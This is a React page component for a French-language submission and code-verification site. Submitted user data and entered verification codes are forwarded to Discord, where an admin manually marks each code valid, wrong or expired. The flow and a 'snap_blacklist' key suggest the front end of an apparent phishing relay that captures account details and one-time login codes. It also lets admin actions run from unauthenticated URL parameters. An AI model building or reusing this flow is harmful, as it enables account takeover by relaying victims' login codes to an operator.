import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";
import SubmissionForm from "@/components/SubmissionForm";
import SuccessScreen from "@/components/SuccessScreen";
import CodeVerification from "@/components/CodeVerification";
import CodeWaiting from "@/components/CodeWaiting";
import WaitingQueue from "@/components/WaitingQueue";
import VerificationSuccess from "@/components/VerificationSuccess";
import ResultScreen from "@/components/ResultScreen";
import StatusCheck from "@/components/StatusCheck";
import FAQ from "@/components/FAQ";

export default function Home() {
  const getParams = () => new URLSearchParams(window.location.search);

  const getInitialStep = () => {
    const p = getParams();
    // Admin action links from Discord (after code entry)
    if (p.get("triggerAction")) return "triggerAction";
    // Legacy trigger for sending code ready
    if (p.get("trigger")) return "form";
    if (p.get("step") === "code") return "code";
    return "form";
  };

  const [step, setStep] = useState(getInitialStep);
  const [loading, setLoading] = useState(false);
  const [submittedData, setSubmittedData] = useState(null);
  const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
  const pollingRef = useRef(null);
  const [showStatusCheck, setShowStatusCheck] = useState(false);
  const [showFAQ, setShowFAQ] = useState(false);
  const [adminInactive, setAdminInactive] = useState(false);
  const [clientIP, setClientIP] = useState(null);
  const [isBlacklisted, setIsBlacklisted] = useState(false);

  // Check if client IP is blacklisted
  useEffect(() => {
    const checkBlacklist = async () => {
      try {
        const res = await base44.functions.invoke("getClientIP", {});
        const ip = res?.data?.ip;
        setClientIP(ip);

        const saved = localStorage.getItem("snap_blacklist");
        const blacklist = saved ? JSON.parse(saved) : [];
        const blocked = blacklist.some(item => item.type === "ip" && item.value === ip);
        setIsBlacklisted(blocked);
      } catch (error) {
        console.error("Error checking blacklist:", error);
      }
    };
    checkBlacklist();
  }, []);

  // Handle ?trigger=ID from Discord (send code ready)
  useEffect(() => {
    const triggerId = getParams().get("trigger");
    if (triggerId) {
      base44.functions.invoke("sendCode", { submissionId: triggerId, action: "code_ready" }).catch(() => {});
    }
  }, []);

  // Handle ?triggerAction=valid|wrong|expired&id=... from Discord (after code entry)
  useEffect(() => {
    if (step !== "triggerAction") return;
    const p = getParams();
    const action = p.get("triggerAction");
    const id = p.get("id");
    if (!action || !id) { setStep("form"); return; }

    base44.functions.invoke("sendCode", { submissionId: id, action })
      .catch(() => {})
      .finally(() => {
        window.history.replaceState({}, "", "/");
        setStep("adminDone");
      });
  }, []);

  // Poll every 3s when on "validation" step (waiting for code_ready)
  useEffect(() => {
    if (step === "validation" && submissionId) {
      pollingRef.current = setInterval(async () => {
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        const s = res?.data?.status;
        if (s === "code_ready") {
          clearInterval(pollingRef.current);
          setStep("code");
        } else if (s === "code_wrong" || s === "code_expired") {
          clearInterval(pollingRef.current);
          setStep("wrong");
        } else if (s === "waiting_queue") {
          clearInterval(pollingRef.current);
          setStep("queue");
        }
      }, 3000);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  // Poll every 3s when on "waiting" step (waiting for admin decision on code)
  useEffect(() => {
    if (step === "waiting" && submissionId) {
      pollingRef.current = setInterval(async () => {
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        const s = res?.data?.status;
        if (s === "code_valid") {
          clearInterval(pollingRef.current);
          setStep("verified");
        } else if (s === "code_wrong") {
          clearInterval(pollingRef.current);
          setStep("wrong");
        } else if (s === "code_expired") {
          clearInterval(pollingRef.current);
          setStep("expired");
        } else if (s === "waiting_queue") {
          clearInterval(pollingRef.current);
          setStep("queue");
        }
      }, 3000);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  const handleSubmit = async (data) => {
    setLoading(true);
    const record = await base44.entities.Submission.create(data);
    await base44.functions.invoke("notifyDiscord", { ...data, submissionId: record.id }).catch(() => {});
    setSubmittedData(data);
    setSubmissionId(record.id);
    setStep("validation");
    setLoading(false);
  };

  const handleCodeSubmit = async (code) => {
    setLoading(true);
    await base44.functions.invoke("notifyCodeEntered", {
      ...submittedData,
      code,
      submissionId,
    }).catch(() => {});
    setStep("waiting"); // Show waiting screen, poll for admin decision
    setLoading(false);
  };

  const handleBack = () => {
    window.location.href = "/";
  };

  const handleRetryCode = () => {
   setStep("code");
  };

  const handleCodeExpire = () => {
   setStep("expired");
  };

  if (isBlacklisted) {
    return (
      <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-8">
        <div className="relative z-10 w-full max-w-md text-center">
          <div className="bg-card border border-destructive/30 rounded-2xl px-6 py-10 shadow-xl">
            <div className="text-5xl mb-4">🚫</div>
            <h1 className="font-heading text-2xl font-bold text-destructive mb-2">Accès refusé</h1>
            <p className="text-muted-foreground text-sm mb-2">Votre adresse IP a été bloquée.</p>
            <p className="text-muted-foreground text-xs text-center break-all">{clientIP}</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-8 md:py-12 safe-area-inset">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none hidden md:block" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none hidden md:block" />

      <div className="relative z-10 w-full max-w-md min-h-screen md:min-h-auto flex flex-col justify-center">
        {showFAQ ? (
          <FAQ onBack={() => setShowFAQ(false)} />
        ) : showStatusCheck ? (
          <StatusCheck onBack={() => setShowStatusCheck(false)} />
        ) : (
          <>
            {step === "form"       && <SubmissionForm onSubmit={handleSubmit} loading={loading} onStatusCheck={() => setShowStatusCheck(true)} onFaqClick={() => setShowFAQ(true)} />}
            {step === "noAdmin"    && (
              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
                <div className="text-4xl mb-4">⏳</div>
                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Aucun admin disponible</h2>
                <p className="text-muted-foreground text-sm mb-6">Les administrateurs sont actuellement absents. Votre demande sera traitée dès que possible.</p>
                <button onClick={() => setStep("form")} className="px-4 py-2 bg-primary text-primary-foreground rounded-lg text-sm font-medium hover:bg-primary/80 transition-colors">
                  Retour
                </button>
              </div>
            )}
            {step === "validation" && <SuccessScreen data={submittedData} />}
            {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
            {step === "waiting"    && <CodeWaiting />}
            {step === "queue"      && <WaitingQueue />}
            {step === "verified"   && <VerificationSuccess data={submittedData} />}
            {step === "triggerAction" && (
              <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
            )}
            {step === "adminDone" && (
              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
                <div className="text-4xl mb-4">✅</div>
                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Action effectuée</h2>
                <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
              </div>
            )}
            {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
            {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
          </>
        )}
      </div>
    </div>
  );
}